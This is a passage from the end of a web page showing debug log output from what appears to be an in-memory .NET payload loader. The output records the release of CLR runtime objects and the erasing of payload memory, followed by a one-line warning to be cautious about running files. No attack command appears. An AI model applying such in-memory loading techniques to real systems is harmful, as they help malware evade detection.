DEBUG: inmem_dotnet.c:335:FreeAssembly(): Assembly::Release
DEBUG: inmem_dotnet.c:341:FreeAssembly(): AppDomain::Release
DEBUG: inmem_dotnet.c:347:FreeAssembly(): IUnknown::Release
DEBUG: inmem_dotnet.c:353:FreeAssembly(): ICorRuntimeHost::Stop
DEBUG: inmem_dotnet.c:356:FreeAssembly(): ICorRuntimeHost::Release
DEBUG: inmem_dotnet.c:362:FreeAssembly(): ICLRRuntimeInfo::Release
DEBUG: inmem_dotnet.c:368:FreeAssembly(): ICLRMetaHost::Release
DEBUG: payload.c:171:ThreadProc(): Erasing RW memory for instance
DEBUG: payload.c:174:ThreadProc(): Releasing RW memory for instance
</pre>

<p>Obviously you should be cautious with what files you decide to execute on your machine.</p>

</body>
</html>
